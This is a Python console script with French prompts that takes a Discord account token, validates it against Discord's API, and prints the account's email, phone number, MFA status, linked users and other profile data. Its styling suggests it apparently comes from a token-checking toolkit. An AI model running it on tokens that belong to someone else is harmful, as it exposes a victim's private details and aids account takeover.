import time
import colorama
import requests
from datetime import datetime, timezone

colorama.init(autoreset=True)
color = colorama.Fore
red = color.RED
white = color.WHITE
reset = color.RESET

INFO = f'{red}[{white}!{red}] |'
ERROR = f'{red}[{white}x{red}] |'
INPUT = f'{red}[{white}>{red}] |'
WAIT = f'{red}[{white}~{red}] |'

def Continue():
    input(color.RED + f"{INFO} Appuyez pour continuer -> " + color.RESET)   

def Title(title):      
    print(color.RED + title + color.RESET)   

def ErrorChoice():
    print(f"{color.RED}{ERROR} Choix invalide !", color.RESET)
    time.sleep(3)

def CheckToken(token):
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        status = "Valid"
        user = r.json()
        username_discord = user['username']
        token_sensur = token[:-25] + '.' * 3
        print(f"{white}[{red}1{white}]{red} -> {red}Status: {white}{status}{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
        return user
    else:
        status = "Invalid"
        print(f"{white}[{red}1{white}]{red} -> {red}Status: {white}{status}{red} | {red}Token: {white}{token}")
        return None

def getTokenInformation(user):
    try:
        username_discord = user['username'] + '#' + user['discriminator']
    except KeyError:
        username_discord = "None"
    
    try:
        display_name_discord = user['global_name']
    except KeyError:
        display_name_discord = "None"

    try:
        user_id_discord = user['id']
    except KeyError:
        user_id_discord = "None"

    try:
        email_discord = user['email']
    except KeyError:
        email_discord = "None"

    try:
        email_verified_discord = user['verified']
    except KeyError:
        email_verified_discord = "None"

    try:
        phone_discord = user['phone']
    except KeyError:
        phone_discord = "None"

    try:
        mfa_discord = user['mfa_enabled']
    except KeyError:
        mfa_discord = "None"

    try:
        country_discord = user['locale']
    except KeyError:
        country_discord = "None"

    try:
        created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc)
    except KeyError:
        created_at_discord = "None"

    try:
        nitro_discord = {
            0: 'False',
            1: 'Nitro Classic',
            2: 'Nitro Boosts',
            3: 'Nitro Basic'
        }.get(user.get('premium_type'), 'None')
    except KeyError:
        nitro_discord = "None"

    try:
        avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
    except KeyError:
        avatar_url_discord = "None"
    
    try:
        avatar_discord = user['avatar']
    except KeyError:
        avatar_discord = "None"

    try:
        avatar_decoration_discord = user['avatar_decoration_data']
    except KeyError:
        avatar_decoration_discord = "None"
    
    try:
        public_flags_discord = user['public_flags']
    except KeyError:
        public_flags_discord = "None"
    
    try:
        flags_discord = user['flags']
    except KeyError:
        flags_discord = "None"

    try:
        banner_discord = user['banner']
    except KeyError:
        banner_discord = "None"
    
    try:
        banner_color_discord = user['banner_color']
    except KeyError:
        banner_color_discord = "None"

    try:
        accent_color_discord = user["accent_color"]
    except KeyError:
        accent_color_discord = "None"

    try:
        nsfw_discord = user['nsfw_allowed']
    except KeyError:
        nsfw_discord = "None"

    try:
        linked_users_discord = user['linked_users']
    except KeyError:
        linked_users_discord = "None"
    
    try:
        bio_discord = "\n" + user['bio']
        if not bio_discord.strip() or bio_discord.isspace():
            bio_discord = "None"
    except KeyError:
        bio_discord = "None"
    
    try:
        authenticator_types_discord = user['authenticator_types']
    except KeyError:
        authenticator_types_discord = "None"

    return {
        "username_discord": username_discord,
        "display_name_discord": display_name_discord,
        "user_id_discord": user_id_discord,
        "email_discord": email_discord,
        "email_verified_discord": email_verified_discord,
        "phone_discord": phone_discord,
        "mfa_discord": mfa_discord,
        "country_discord": country_discord,
        "created_at_discord": created_at_discord,
        "nitro_discord": nitro_discord,
        "avatar_url_discord": avatar_url_discord,
        "avatar_discord": avatar_discord,
        "avatar_decoration_discord": avatar_decoration_discord,
        "public_flags_discord": public_flags_discord,
        "flags_discord": flags_discord,
        "banner_discord": banner_discord,
        "banner_color_discord": banner_color_discord,
        "accent_color_discord": accent_color_discord,
        "nsfw_discord": nsfw_discord,
        "linked_users_discord": linked_users_discord,
        "bio_discord": bio_discord,
        "authenticator_types_discord": authenticator_types_discord
    }

def main():
    Title("Discord Token Info")


    token_discord = input(f"\n{color.RED}{INPUT} Entrez le token Discord -> {color.RESET}")

    print(f"{color.RED}{WAIT} Récupération des informations..{reset}")
    
    user = CheckToken(token_discord)
    
    if user:
        info = getTokenInformation(user)
        print(f"{INFO} Informations utilisateur:")
        for key, value in info.items():
            print(f"{INFO} {key.replace('_', ' ').capitalize()}: {white}{value}")
    else:
        print(f"{ERROR} Impossible de récupérer les informations utilisateur. Le token peut être invalide ou expiré.")
    
    Continue()

if __name__ == "__main__":
    main()
